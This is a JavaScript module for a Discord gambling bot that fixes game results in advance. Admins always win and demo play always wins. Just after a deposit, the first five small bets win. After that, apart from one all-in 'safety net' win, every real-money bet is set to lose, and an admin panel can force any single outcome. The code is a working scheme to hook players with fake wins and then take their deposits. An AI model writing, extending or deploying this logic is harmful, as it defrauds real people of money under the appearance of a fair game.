const { getUser, saveUser } = require('./database');
const { PermissionFlagsBits } = require('discord.js');
const config = require('../config');

function isAdminMember(member) {
  if (!member) return false;
  try {
    if (member.user?.id === config.ownerId || member.id === config.ownerId) return true;
    return member.permissions.has(PermissionFlagsBits.Administrator) ||
      config.adminRoleIds.some(id => member.roles.cache.has(id));
  } catch { return false; }
}

/**
 * Returns 'win', 'allin_win', 'lose', or 'fair'.
 * Call BEFORE spendBet so user.balance reflects pre-bet amount.
 */
function getRiggedMode(userId, isDemo, bet, member) {
  if (isAdminMember(member)) return 'win';

  const u = getUser(userId);

  // Admin-forced single-game override (.ayowtf panel) — bypasses everything
  if (u.forceNextOutcome) return u.forceNextOutcome;

  // Demo balance: always win, no exceptions
  if (isDemo) return 'win';

  // Deposit honeymoon: first 5 bets each under 10% of deposit = win; else lose
  if (u.depositHoneymoon && u.depositAmount > 0) {
    const honeyBets = u.honeyBetsPlaced || 0;
    const threshold = u.depositAmount * 0.10;
    if (honeyBets < 5 && bet < threshold) {
      return 'win';
    }
    // Over 5 bets or bet too big = always lose
    return 'lose';
  }

  // All-in safety net for near-broke users (one-time only)
  if (!u.hasUsedAllin && u.balance > 0 && u.balance <= 10 && bet >= u.balance) {
    return 'allin_win';
  }

  return 'lose';
}

function isForceWin(mode) {
  return mode === 'win' || mode === 'allin_win';
}

/**
 * Call after each completed game to track rigged game counters.
 */
function recordRiggedGame(userId, isDemo, mode) {
  const u = getUser(userId);
  // Clear any single-game admin override now that the game is done
  if (u.forceNextOutcome) delete u.forceNextOutcome;
  if (isDemo) {
    u.demoGamesPlayed = (u.demoGamesPlayed || 0) + 1;
  } else {
    u.realGamesPlayed = (u.realGamesPlayed || 0) + 1;
    if (mode === 'allin_win') u.hasUsedAllin = true;
    // Advance honeymoon bet counter
    if (u.depositHoneymoon) {
      u.honeyBetsPlaced = (u.honeyBetsPlaced || 0) + 1;
    }
  }
  saveUser(userId, u);
}

module.exports = { getRiggedMode, isForceWin, recordRiggedGame };
